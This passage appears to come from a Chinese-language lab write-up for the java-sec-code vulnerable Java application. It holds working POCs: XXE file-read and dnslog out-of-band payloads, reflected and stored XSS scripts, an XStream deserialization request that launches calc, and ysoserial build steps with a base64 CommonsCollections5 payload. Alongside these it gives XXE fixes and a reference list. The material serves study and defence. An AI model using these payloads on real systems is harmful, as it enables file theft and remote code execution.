```





### 9.这些方法的利用和修复都是一样的。



POC构造：

```
POST /xxe/***/*** HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/xml
Content-Length: 198  可以不写
Connection: close
        此处空一行 分隔 Header 与 Body 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">  
]>
<root>
    <name>&xxe;</name>
</root>
或
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://1izyf3.dnslog.cn">
]>
<root>
  <name>&xxe;</name>
</root>
```



修复：

```
xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```





## XSS



```java
@RequestMapping("/reflect")
@ResponseBody
public static String reflect(String xss) {
    return xss;
}
```



```
http://127.0.0.1:8081/xss/reflect?xss=<script>alert(1)</script>
```



![20250727110941871](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946271.png)

```java
//先将 xss 储存在 cookie 中，
@RequestMapping("/stored/store")
@ResponseBody
public String store(String xss, HttpServletResponse response) {
    Cookie cookie = new Cookie("xss", xss);
    response.addCookie(cookie);
    return "Set param into cookie";
}

//访问 /stored/show 看到xss
 @RequestMapping("/stored/show")
    @ResponseBody
    public String show(@CookieValue("xss") String xss) {
        return xss;
    }
```

```
http://127.0.0.1:8081/xss/stored/store?xss=<script>alert(1)</script>

http://127.0.0.1:8081/xss/stored/show
```



![20250727111445251](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946560.png)

![image-20250727111506881](https://gitee.com/xvshifu/pic-go/raw/master/img/20250727111506996.png)



## XStreamRce



>XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。
>
>**也就是说，使用XStream，我们可以把Java对象转换成XML，也可以将XML转换为Java对象。**
>
>有RCE漏洞受影响版本：
>Xstream affected version: 1.4.10 or <= 1.4.6
>
>CVE-2020-26217 | XStream远程代码执行漏洞 
>
>https://www.cnblogs.com/303donatello/p/13998245.html

![20250727124508575](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947532.png)

```Java
@PostMapping("/xstream")
public String parseXml(HttpServletRequest request) throws Exception {
    String xml = WebUtils.getRequestBody(request);
    XStream xstream = new XStream(new DomDriver());
    xstream.addPermission(AnyTypePermission.ANY); // This will cause all XStream versions to be affected.
    xstream.fromXML(xml);
    return "xstream";
}
```



POC:

```
POST /xstream HTTP/1.1
Host: 127.0.0.1:8081
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=629E8EB9997DA26781472C6FFCAF7454; XSRF-TOKEN=f6390ed7-0e1c-4fbe-a342-1177716a0983; remember-me=YWRtaW46MTc1NDgwMTUzMDEzMTowZDM3ZjcxZDFmODc2YmUyNDQ0NGY3MmZkYTFkY2NmMQ
Content-Type: application/xml
Content-Length: 439
Connection: close

<sorted-set>  
  <string>foo</string>
  <dynamic-proxy> <!-- -->
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>cmd</string>
          <string>/c</string>
		  <string>calc</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```



![20250727132402482](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947651.png)



# 参考文章：

java经典反序列化漏洞复现

https://www.cnblogs.com/0kooo-yz/p/18399516

代码审计入门之java-sec-code（一）

https://www.freebuf.com/articles/web/289863.html

Java-Sec代码审计漏洞篇(一)

https://xz.aliyun.com/news/15669

Java-Sec代码审计漏洞篇(二)

https://xz.aliyun.com/news/15721

Java-sec-code靶场分析练习

https://buaq.net/go-307106.html

java-sec-code 靶场复现

https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/

SnakeYaml反序列化漏洞研究

https://www.cnblogs.com/LittleHann/p/17828948.html

跨域资源共享 CORS 详解

https://www.ruanyifeng.com/blog/2016/04/cors.html

初识HTTP响应拆分攻击（CRLF Injection）

https://www.anquanke.com/post/id/240014

CSRF漏洞原理攻击与防御（非常细）-CSDN博客

https://blog.csdn.net/qq_43378996/article/details/123910614

JSONP 跨域原理及实现

https://segmentfault.com/a/1190000041946934

 PostgreSQL JDBC 驱动远程代码执行漏洞（CVE-2022-21724）

https://avd.aliyun.com/detail?id=AVD-2022-21724&timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr%2BmCnCoD

PreparedStatement的使用

https://www.cnblogs.com/ysw-go/p/5459330.html

路径穿越（Path Traversal）详解-CSDN博客

https://blog.csdn.net/qingzhantianxia/article/details/128204437

SSTI（模板注入）漏洞（入门篇）

https://www.cnblogs.com/bmjoker/p/13508538.html

SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客

https://blog.csdn.net/qq_43378996/article/details/124050308

由浅入深SpEL表达式注入漏洞

http://rui0.cn/archives/1043

XXE漏洞原理、检测与修复

https://www.cnblogs.com/mysticbinary/p/12668547.html

从XML相关一步一步到XXE漏洞

https://xz.aliyun.com/news/6483

CVE-2020-26217 | XStream远程代码执行漏洞 

https://www.cnblogs.com/303donatello/p/13998245.html



# 工具的安装&使用





## ysoserial.jar

```
Linux：

检查Java版本：
java -version
若未安装：
sudo apt update
sudo apt install openjdk-8-jdk-headless

安装 Git 和 Maven
sudo apt install git maven -y

拉取源码
git clone https://github.com/frohoff/ysoserial.git

编译
cd ysoserial
mvn clean package -DskipTests

编译后所在文件夹
cd target/ysoserial-0.0.6-SNAPSHOT-all.jar 

重命名
cp target/ysoserial-*-all.jar ~/ysoserial.jar

测试是否安装成功
java -jar ysoserial.jar

生成payload
calc	Windows 内置命令	
"gnome-calculator"	Linux + GUI + 有此命令	
"open -a Calculator"	macOS + 图形环境

Windows：

java -jar ~/ysoserial.jar CommonsCollections5 calc | base64

rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4

```























